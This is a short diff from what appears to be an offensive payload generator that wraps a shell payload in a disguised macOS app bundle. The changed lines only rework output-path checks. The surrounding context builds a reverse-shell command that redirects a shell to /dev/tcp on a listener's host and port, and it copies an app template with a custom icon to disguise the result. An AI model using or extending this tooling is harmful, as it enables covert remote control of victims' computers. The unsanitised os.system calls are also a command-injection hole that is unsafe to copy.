@@ -39,26 +39,16 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
-		if os.path.isdir(path):
-		    if os.path.exists(path):
-			if path[:-1] == "/":
-			    payload_save_path = path + "payload.app"
-			else:
-			    payload_save_path = path + "/payload.app"
+		direct = os.path.split(path)[0]
+		if os.path.exists(direct):
+		    if os.path.isdir(direct):
+		        payload_save_path = path
 		    else:
-			h.info_error("Local directory: "+path+": does not exist!")
+			h.info_error("Error: "+direct+": not a directory!")
 			exit
 		else:
-		    direct = os.path.split(path)[0]
-		    if os.path.exists(direct):
-			if os.path.isdir(direct):
-		            payload_save_path = path+"/Contents/MacOS/payload.sh"
-			else:
-			    h.info_error("Error: "+direct+": not a directory!")
-			    exit
-		    else:
-		        h.info_error("Local directory: "+direct+": does not exist!")
-		        exit
+		    h.info_error("Local directory: "+direct+": does not exist!")
+		    exit
 		os.system("cp -r data/app/payload.app "+path+" > /dev/null")
 		os.system("mv "+icon+" "+path+"/Contents/Resources/payload.icns > /dev/null")
 		payload = """\
